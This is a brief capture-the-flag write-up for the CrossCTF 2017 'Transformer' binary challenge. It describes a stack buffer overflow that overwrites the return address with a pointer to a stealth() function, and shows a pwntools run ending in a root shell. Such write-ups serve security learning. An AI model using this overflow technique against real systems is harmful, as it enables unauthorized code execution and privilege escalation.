# CrossCTF_2017: Transformer

**Category:** Binary
**Points:** 100
**Description:**

>192.168.0.31:10006 [File here](/problem-static/binary/transformer/transformer)

## Write-up
This is a really simple one and is easily defeated by nopping most parts of the binary. In this case, we can exploit this by buffer overflowing word 1 with `256` bytes of maximum bytes, followed by `4` bytes of junk, followed by `4` bytes of pointer pointing to `stealth()`.

This can be automated with pwntools and [Python](solve.py)

    $ ./solve.py 
    [*] '/root/repos/crossctf_2017_writeup/finals/transformer_100/transformer'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE
    [+] Starting program './transformer': Done
    [ERROR] Neither 'qemu-i386' nor 'qemu-i386-static' are available
    [+] Are we r00ted?
    [*] Switching to interactive mode
    uid=0(root) gid=0(root) groups=0(root)
    $ cat flag.txt

Therefore, the flag is ``.
